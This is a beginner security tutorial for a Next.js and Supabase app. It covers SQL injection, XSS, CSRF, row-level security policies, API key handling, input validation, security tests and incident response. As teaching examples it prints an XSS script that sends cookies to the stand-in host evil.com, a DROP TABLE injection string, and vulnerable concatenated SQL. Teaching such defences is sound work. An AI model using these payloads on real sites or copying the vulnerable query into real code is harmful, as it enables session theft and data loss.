# Security Basics

## 🛡️ Why Security Matters

Security isn't optional. It's not something you add later. It's fundamental to building software that people can trust.

**The C2C Approach**: Build security in from day one. Your users' data is sacred.

## 🔒 The Security Mindset

### Assume Everything Will Be Attacked

- Your database will be compromised
- Your API keys will be exposed
- Your users will try to break things
- Malicious actors will target your app

**This isn't paranoia - it's preparation.**

### Security is About Trust

When someone uses your app, they're trusting you with:
- Their personal information
- Their contact details
- Their location data
- Their time and effort

**Don't break that trust.**

## 🚨 Common Security Vulnerabilities

### 1. **SQL Injection**

**What it is**: Attackers inject malicious SQL code through user input.

**Example Attack**:
```sql
-- User enters this in a search box:
'; DROP TABLE resources; --

-- Your vulnerable code:
const query = `SELECT * FROM resources WHERE name LIKE '%${userInput}%'`
```

**How to Prevent**:
- Use parameterized queries (Supabase does this automatically)
- Validate all input
- Never concatenate user input into SQL

**Supabase Protection**:
```typescript
// ✅ SAFE - Supabase uses parameterized queries
const { data } = await supabase
  .from('resources')
  .select('*')
  .ilike('name', `%${searchTerm}%`)

// ❌ DANGEROUS - Never do this
const query = `SELECT * FROM resources WHERE name LIKE '%${searchTerm}%'`
```

### 2. **Cross-Site Scripting (XSS)**

**What it is**: Attackers inject malicious JavaScript into your app.

**Example Attack**:
```html
<!-- User enters this in a comment field: -->
<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>
```

**How to Prevent**:
- Sanitize all user input
- Use React's built-in XSS protection
- Validate data on the server
- Use Content Security Policy (CSP)

**React Protection**:
```tsx
// ✅ SAFE - React automatically escapes content
<div>{userInput}</div>

// ❌ DANGEROUS - Never use dangerouslySetInnerHTML with user data
<div dangerouslySetInnerHTML={{ __html: userInput }} />
```

### 3. **Cross-Site Request Forgery (CSRF)**

**What it is**: Attackers trick users into making unwanted requests.

**How to Prevent**:
- Use CSRF tokens
- Validate request origins
- Use SameSite cookies

**Next.js Protection**:
Next.js automatically includes CSRF protection. Don't disable it.

### 4. **Authentication Bypass**

**What it is**: Users access data they shouldn't see.

**Example Attack**:
```typescript
// Attacker tries to access another user's data
const { data } = await supabase
  .from('profiles')
  .select('*')
  .eq('id', 'other-user-id')
```

**How to Prevent**:
- Use Row-Level Security (RLS)
- Validate authentication on every request
- Never trust client-side authentication alone

**RLS Protection**:
```sql
-- ✅ SAFE - Users can only see their own profile
CREATE POLICY "Users can view own profile"
  ON profiles
  FOR SELECT
  USING (auth.uid() = id);
```

### 5. **Data Exposure**

**What it is**: Sensitive data is exposed through errors or APIs.

**Example Attack**:
```json
// Error message exposes database structure
{
  "error": "Table 'users' doesn't exist",
  "query": "SELECT * FROM users WHERE id = 'admin'"
}
```

**How to Prevent**:
- Don't expose internal details in errors
- Log errors securely
- Use generic error messages for users

## 🔐 Row-Level Security (RLS) Deep Dive

RLS is PostgreSQL's built-in security feature. It's your last line of defense.

### How RLS Works

1. **Enable RLS** on a table
2. **Create policies** that define access rules
3. **PostgreSQL enforces** these policies on every query

### RLS Policy Patterns

#### Public Read, Authenticated Write
```sql
-- Anyone can read, only authenticated users can write
CREATE POLICY "Public read access"
  ON resources
  FOR SELECT
  USING (deleted_at IS NULL);

CREATE POLICY "Authenticated users can create"
  ON resources
  FOR INSERT
  WITH CHECK (auth.uid() IS NOT NULL);
```

#### User-Specific Access
```sql
-- Users can only access their own data
CREATE POLICY "Users can manage own resources"
  ON resources
  FOR ALL
  USING (auth.uid() = created_by);
```

#### Admin-Only Access
```sql
-- Only admins can verify resources
CREATE POLICY "Admins can verify resources"
  ON resources
  FOR UPDATE
  USING (
    EXISTS (
      SELECT 1 FROM profiles 
      WHERE id = auth.uid() 
      AND role = 'admin'
    )
  );
```

### Testing RLS Policies

```sql
-- Test as different users
SET LOCAL role TO authenticated;
SET LOCAL "request.jwt.claims" TO '{"sub": "user-uuid"}';

-- Try to access data
SELECT * FROM resources;
-- Should only return data the user is allowed to see
```

## 🔑 API Key Security

### Environment Variables

**✅ DO**:
```bash
# .env.local (never commit this file)
NEXT_PUBLIC_SUPABASE_URL=https://your-project.supabase.co
NEXT_PUBLIC_SUPABASE_ANON_KEY=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
SUPABASE_SERVICE_ROLE_KEY=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9... # Server only!
```

**❌ DON'T**:
```typescript
// Never hardcode keys in your code
const supabaseUrl = "https://your-project.supabase.co"
const supabaseKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
```

### Key Types

#### Anon Key (Public)
- Safe to expose in browser
- Limited by RLS policies
- Use in client-side code

#### Service Role Key (Secret)
- Full database access
- Bypasses RLS policies
- **NEVER** use in client-side code
- Only use in server-side operations

### Key Rotation

If a key is compromised:
1. Generate new keys in Supabase dashboard
2. Update your environment variables
3. Deploy the new keys
4. Monitor for suspicious activity

## 🛡️ Input Validation

### Client-Side Validation

```typescript
// ✅ Good - Validate on client for UX
const validateResource = (data: ResourceFormData) => {
  const errors: string[] = []
  
  if (!data.name.trim()) {
    errors.push('Name is required')
  }
  
  if (data.name.length > 100) {
    errors.push('Name must be less than 100 characters')
  }
  
  if (data.email && !isValidEmail(data.email)) {
    errors.push('Invalid email format')
  }
  
  return errors
}
```

### Server-Side Validation

```typescript
// ✅ Essential - Always validate on server
import { z } from 'zod'

const ResourceSchema = z.object({
  name: z.string().min(1).max(100),
  description: z.string().min(1).max(1000),
  email: z.string().email().optional(),
  phone: z.string().regex(/^\+?[\d\s\-\(\)]+$/).optional(),
})

export async function POST(request: Request) {
  try {
    const body = await request.json()
    const validatedData = ResourceSchema.parse(body)
    
    // Process validated data...
  } catch (error) {
    return Response.json({ error: 'Invalid data' }, { status: 400 })
  }
}
```

## 🔍 Security Testing

### Manual Testing Checklist

```
□ Can unauthenticated users access protected routes?
□ Can users access other users' data?
□ Are API keys exposed in browser DevTools?
□ Does SQL injection work? (it shouldn't!)
□ Can users bypass rate limits?
□ Are error messages exposing sensitive information?
□ Can users upload malicious files?
□ Are passwords properly hashed?
□ Is sensitive data encrypted in transit?
□ Are logs secure and not exposing secrets?
```

### Automated Testing

```typescript
// Example security test
describe('Resource API Security', () => {
  it('should not allow unauthenticated users to create resources', async () => {
    const response = await fetch('/api/resources', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ name: 'Test Resource' })
    })
    
    expect(response.status).toBe(401)
  })
  
  it('should not allow users to access other users resources', async () => {
    const response = await fetch('/api/resources/user-2-resource')
    
    expect(response.status).toBe(403)
  })
})
```

## 🚨 Incident Response

### If You're Compromised

1. **Immediately**:
   - Rotate all API keys
   - Change all passwords
   - Review access logs
   - Notify affected users

2. **Investigate**:
   - How did the breach happen?
   - What data was accessed?
   - How long was the vulnerability present?

3. **Fix**:
   - Patch the vulnerability
   - Improve monitoring
   - Update security procedures

4. **Learn**:
   - Document lessons learned
   - Update security training
   - Implement additional safeguards

## 📋 Security Checklist

### Before Launch

```
□ All RLS policies are enabled and tested
□ API keys are properly secured
□ Input validation is implemented
□ Error messages don't expose sensitive data
□ Authentication is required for sensitive operations
□ Rate limiting is implemented
□ HTTPS is enforced in production
□ Security headers are configured
□ Database backups are encrypted
□ Access logs are monitored
□ Incident response plan is documented
```

### Ongoing Security

```
□ Regular security audits
□ Dependency updates
□ Access log monitoring
□ User feedback on security issues
□ Penetration testing
□ Security training for team
□ Incident response drills
□ Backup and recovery testing
```

## 🎯 Security Best Practices

### 1. **Principle of Least Privilege**
Give users and systems only the minimum access they need.

### 2. **Defense in Depth**
Use multiple layers of security:
- Network security
- Application security
- Database security
- User education

### 3. **Fail Secure**
If something goes wrong, fail in a secure state:
- Deny access by default
- Log security events
- Alert on suspicious activity

### 4. **Security by Design**
Build security into your application from the start:
- Threat modeling
- Secure coding practices
- Regular security reviews

## 🚀 Next Steps

Now that you understand security basics:

1. **Review your RLS policies** in the Resource Finder
2. **Test your authentication** thoroughly
3. **Validate all user input** on the server
4. **Monitor your application** for security issues
5. **Keep learning** about security best practices

---

**Remember**: Security is not a destination, it's a journey. Stay vigilant, keep learning, and always prioritize your users' safety.

Next: [Next Steps →](./06-NEXT-STEPS.md)
